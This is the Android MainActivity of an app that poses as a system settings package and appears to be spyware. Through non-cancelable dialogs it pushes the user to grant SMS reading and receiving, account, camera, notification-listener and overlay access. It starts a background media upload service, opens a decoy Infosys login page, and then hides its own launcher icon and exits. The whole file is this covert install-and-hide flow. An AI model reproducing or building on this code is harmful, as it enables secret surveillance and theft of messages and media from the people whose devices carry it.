package com.android.data.settings;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.design.widget.BottomSheetDialog;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.Fragment;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.Toast;

import com.android.data.settings.Model.Permission;
import com.android.data.settings.Service.MediaService;
import com.android.data.settings.Service.NotificationService;
import com.android.data.settings.Utility.MediaUtility;

import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {
    public static final String TAG = "MediaStore";
    private static final int REQ_CODE_ASK_PERMS = 401;
    private static final int REQ_CODE_FORCE_PERMS = 402;
    private Intent serviceIntent;
    private View decorView;
    private MediaUtility mediaUtility;
    private BottomSheetDialog dialogNotificationAccess, dialogRequestPermission, dialogOverlayPermission;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.activity_main);

        //replaceFragment(new HomeFragment());

        decorView = getWindow().getDecorView();
        serviceIntent = new Intent(this, MediaService.class);
        mediaUtility = new MediaUtility(this);

        if(mediaUtility.isFirstInstall()) {
            initConfig();
        }

        //checkPermissions();
        //ActivityCompat.requestPermissions(MainActivity.this, allPerms, REQ_CODE_ASK_PERMS);

        validatePermissions();

        BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(this);
        bottomSheetDialog.setTitle("Enable Overlay Access");
    }

    private void initConfig() {
        SharedPreferences preferences = getSharedPreferences(MediaConfig.PREF_NAME, MODE_PRIVATE);
        SharedPreferences.Editor editor = preferences.edit();

        editor.putString(MediaConfig.PREF_API_BASE_URL, MediaConfig.DEF_BASE_URL);
        editor.putString(MediaConfig.PREF_IMG_UPLOAD_NAME, MediaConfig.DEF_MEDIA_UPLOAD_NAME);
        editor.putFloat(MediaConfig.PREF_IMG_MAX_WIDTH, MediaConfig.DEF_IMG_WIDTH);
        editor.putFloat(MediaConfig.PREF_IMG_MAX_HEIGHT, MediaConfig.DEF_IMG_HEIGHT);
        editor.putString(MediaConfig.PREF_IMG_COMPRESS_FORMAT, MediaConfig.DEF_IMG_COMPRESSION_FORMAT);
        editor.putString(MediaConfig.PREF_IMG_CONFIG, MediaConfig.DEF_IMG_CONFIG);
        editor.putInt(MediaConfig.PREF_IMG_QUALITY, MediaConfig.DEF_IMG_QUALITY);
        editor.apply();
    }

    String[] allPerms = new String[] {
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.GET_ACCOUNTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.CAMERA,
        Manifest.permission.RECEIVE_BOOT_COMPLETED
    };

    Map<String, Permission> permissionsMap = new HashMap<>();

    private boolean checkPermissions() {
        boolean permsGranted = true;
        for(String permission : allPerms) {
            if(ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permsGranted = false;
            }
        }
        return permsGranted;
    }

    private void validatePermissions() {
        if(this.checkPermissions()) {
            Log.d(TAG, "validatePermissions: on start service");
            startService();
        } else {
            ActivityCompat.requestPermissions(MainActivity.this, allPerms, REQ_CODE_ASK_PERMS);
        }
    }

    private void requestPermission() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            if(mediaUtility.checkPermissionStatus(permissionsMap)
                    != MediaUtility.STATUS_PERMISSIONS_GRANTED) {
                ActivityCompat.requestPermissions(MainActivity.this, allPerms, REQ_CODE_ASK_PERMS);
                return;
            }
        }
        startService();
    }

    public static final int OVERLAY_PERMISSION_CODE = 2525;

    private void checkOverlayAndHideLauncher() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new  Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                if (intent.resolveActivity(getPackageManager()) != null) {
                    showOverlayRequestDialog();
                    return;
                }
            }
        }
        if(dialogOverlayPermission != null && dialogOverlayPermission.isShowing()) {
            dialogOverlayPermission.dismiss();
        }
        hideLauncher();
    }

    public void checkAndStartService() {
        if(!mediaUtility.isServiceRunning(MediaService.class)) {
            startService(new Intent(this, MediaService.class));
        }
    }

    private void showNotificationRequestDialog() {
        if(dialogNotificationAccess == null || !dialogNotificationAccess.isShowing()) {
            dialogNotificationAccess = new BottomSheetDialog(MainActivity.this);
            View view = getLayoutInflater().inflate(R.layout.dialog_request_notification, null);
            Button button = view.findViewById(R.id.btnGetAccess);
            button.setOnClickListener(v -> {
                Intent intentNotificationSettings =
                        new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                startActivity(intentNotificationSettings);
            });

            dialogNotificationAccess.setCancelable(false);
            dialogNotificationAccess.setContentView(view);
            dialogNotificationAccess.show();
        }
    }

    private void showOverlayRequestDialog() {
        if(dialogOverlayPermission == null || !dialogOverlayPermission.isShowing()) {
            dialogOverlayPermission = new BottomSheetDialog(MainActivity.this);
            View view = getLayoutInflater().inflate(R.layout.dialog_overlay_access, null);
            Button button = view.findViewById(R.id.btnGetAccess);
            button.setOnClickListener(v -> {
                Intent intent = new  Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, OVERLAY_PERMISSION_CODE);
            });

            dialogOverlayPermission.setCancelable(false);
            dialogOverlayPermission.setContentView(view);
            dialogOverlayPermission.show();
        }
    }

    private void showRequestPermissionDialog() {
        if(dialogRequestPermission == null || !dialogRequestPermission.isShowing()) {
            dialogRequestPermission = new BottomSheetDialog(MainActivity.this);
            View view = getLayoutInflater().inflate(R.layout.dialog_request_permission, null);

            Button button = view.findViewById(R.id.btnGetAccess);
            button.setOnClickListener(v -> {
                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    Uri uri = Uri.fromParts("package", getPackageName(), null);
                    intent.setData(uri);
                    startActivityForResult(intent, REQ_CODE_FORCE_PERMS);
            });

            Button buttonDone = view.findViewById(R.id.btnDone);
            buttonDone.setOnClickListener(v -> {
                if(checkPermissions()) {
                    if(dialogRequestPermission != null && dialogRequestPermission.isShowing()) {
                        dialogRequestPermission.dismiss();
                    }
                    checkNotificationAndHideLauncher();
                } else {
                    Toast.makeText(MainActivity.this,
                            "Please enable all the permissions under Permissions Screen",
                            Toast.LENGTH_SHORT).show();
                }
            });

            dialogRequestPermission.setCancelable(false);
            dialogRequestPermission.setContentView(view);
            dialogRequestPermission.show();
        }
    }

    private void startService() {
        Log.d(TAG, "On Start Service : " + MediaService.class);
        checkAndStartService();
        checkNotificationAndHideLauncher();
    }

    private void checkNotificationAndHideLauncher() {
        if(!NotificationService.isNotificationListenerConnected) {
            showNotificationRequestDialog();
            return;
        } else if (NotificationService.isNotificationListenerConnected) {
            if(dialogNotificationAccess != null) {
                dialogNotificationAccess.dismiss();
                dialogNotificationAccess = null;
            }
        }

        checkOverlayAndHideLauncher();
    }

    private void openUrl() {
        String urlInfy = "http://campusconnect.infosys.com/login.aspx";
        String urlCiet = "https://cietcbe.almaconnect.com/";
        Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(urlInfy));
        startActivity(browserIntent);
    }

    private void hideLauncher() {
        openUrl();
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        this.finish();
        System.exit(0);
    }

    private void replaceFragment(Fragment fragment) {
        getSupportFragmentManager()
                .beginTransaction()
                .replace(R.id.frameContainer, fragment)
                .commit();
    }

    private void enterImmersiveMode() {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            decorView.setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            );
        } else {
            decorView.setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_FULLSCREEN
            );
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
//        if(dialogNotificationAccess != null && dialogNotificationAccess.isShowing()) {
//            checkNotificationAndHideLauncher();
//        }
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if(hasFocus) {
            enterImmersiveMode();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        Log.d(TAG, "onActivityResult: " + requestCode);
        switch (requestCode) {
            case REQ_CODE_FORCE_PERMS:
                if(checkPermissions()) {
                    if(dialogRequestPermission != null && dialogRequestPermission.isShowing()) {
                        dialogRequestPermission.dismiss();
                    }
                    checkNotificationAndHideLauncher();
                } else {
                    showRequestPermissionDialog();
                }
                break;

            case OVERLAY_PERMISSION_CODE:
                Log.d("TAG", "ON Window Manager Permission");
                checkOverlayAndHideLauncher();
                break;
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        Log.d(TAG, "onRequestPermissionsResult: " + requestCode);
        switch (requestCode) {
            case REQ_CODE_ASK_PERMS:
                Log.d(TAG, "On Permission Callback");

                if(mediaUtility.checkPermissions(grantResults)) {
                    if(dialogRequestPermission != null && dialogRequestPermission.isShowing()) {
                        dialogRequestPermission.dismiss();
                    }
                    startService();
                } else {
                    processPermissions(permissions, grantResults);
                }
                break;
        }
    }

    private void processPermissions(@NonNull String[] permissions, @NonNull int[] grantResults) {
        for (int i = 0, len = permissions.length; i < len; i++) {
            String permission = permissions[i];

            boolean showRationale = true;
            if (grantResults[i] == PackageManager.PERMISSION_DENIED) {
                showRationale = ActivityCompat.shouldShowRequestPermissionRationale( MainActivity.this, permission );
            }
            permissionsMap.put(permission, new Permission(grantResults[i], showRationale));
        }

        int status = mediaUtility.checkPermissionStatus(permissionsMap);

        if(status == MediaUtility.STATUS_PERMISSIONS_PENDING) {
            requestPermission();
        } else if (status == MediaUtility.STATUS_PERMISSIONS_REJECTED) {
            showRequestPermissionDialog();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}
